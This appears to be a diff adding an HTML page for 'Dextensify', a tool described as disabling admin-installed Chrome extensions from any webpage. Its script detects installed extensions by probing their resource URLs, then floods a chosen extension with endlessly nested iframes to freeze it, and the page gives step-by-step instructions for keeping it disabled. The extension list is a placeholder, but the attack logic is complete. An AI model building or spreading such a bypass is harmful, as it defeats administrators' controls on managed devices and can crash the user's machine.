@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Dextensify</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * {
+      font-family: Sans-serif;
+      color: #333;
+    }
+    button {
+      background-color: #33626c;
+      padding: 10px 20px;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    #main_div {
+      max-width: 800px;
+      margin: 20px auto;
+      padding: 0 20px;
+    }
+    h1, h2, p {
+      margin-bottom: 10px;
+    }
+    ol {
+      padding-left: 20px;
+    }
+  </style>
+  <script>
+    let from_id = id => document.getElementById(id);
+    let extensions = {...}; // Your extensions object goes here
+
+    async function check_url(url) {
+      let controller = new AbortController();
+      let timeout = setTimeout(() => controller.abort(), 500);
+
+      try {
+        await fetch(url, {signal: controller.signal});
+        return true;
+      }
+      catch (error) {
+        let error_msg = error+"";
+        return error_msg.includes("AbortError");
+      }
+    }
+    
+    async function detect_extensions() {
+      let detected = [];
+      for (let extension of Object.values(extensions)) {
+        let exists = await check_url(extension.url);
+        if (exists) {
+          detected.push(extension);
+        }
+      }
+      return detected;
+    }
+
+    async function main() {
+      let detected = await detect_extensions();
+      let buttons_container = from_id("buttons_container")
+
+      if (!window.chrome) {
+        buttons_container.innerHTML = `<p><b>Error: You are not running a Chromium-based browser.</b></p>`;
+        return;
+      }
+      else if (detected.length === 0) {
+        buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
+        buttons_container.innerHTML += `<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify">GitHub repository</a>, and provide the extension ID and manifest.</p>`;
+        return;
+      }
+      else {
+        buttons_container.innerHTML = ""
+      }
+
+      for (let extension of detected) {
+        let button = document.createElement("button");
+        button.innerText = `Freeze ${extension.name}`;
+        button.onclick = () => {
+          button_handler(extension);
+        }
+        buttons_container.append(button);
+      }
+    }
+
+    function button_handler(extension) {
+      let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
+      if (cancel) return;
+      
+      setTimeout(() => {
+        create_iframes(extension);
+      }, 5000);
+    }
+
+    function create_iframes(extension) {
+      let iframes = []
+      let iterations = 5;
+      let public_url = extension.url;
+      
+      while (true) {
+        let iframe = document.createElement("iframe");
+        document.body.append(iframe);
+        iframes.push(iframe);
+
+        for (let i=0; i<50; i++) {
+          let subframe = document.createElement("iframe");
+          subframe.src = public_url;
+          subframe.style.width = subframe.style.height = "1px";
+          iframe.contentDocument.body.append(subframe);
+        }
+
+        while (iframes.length > Math.max(3, 10-iterations)) {
+          iframes[0].remove();
+          iframes.shift();
+        }
+
+        iterations++;
+      }
+    }
+
+    function runDextensify() {
+      main();
+    }
+  </script>
+</head>
+<body>
+  <div id="main_div">
+    <h1>Dextensify</h1>
+    <p>Disable admin-installed Chrome extensions from any webpage.</p>
+    <h2>Instructions:</h2>
+    <ol>
+      <li>Open chrome://extensions in a new tab and keep it open.</li>
+      <li>Go to the settings page for the extension you want to disable.</li>
+      <li>On this page, click the "Freeze Extension" button. Immediately switch back to the chrome://extensions tab.</li>
+      <li>On the chrome://extensions page, repeatedly toggle the "Allow access to file URLs" switch for a few seconds.</li>
+      <li>The extension should now be temporarily disabled. To maintain this effect, toggle "Allow access to file URLs" every few minutes or if pages start getting blocked.</li>
+      <li>Occasionally reopen this page to prevent system crashes due to memory leaks.</li>
+    </ol>
+    <div id="buttons_container">
+      <p><i>Detecting extensions...</i></p>
+    </div>
+    <button onclick="runDextensify()">Run Dextensify</button>
+  </div>
+</body>
+</html>
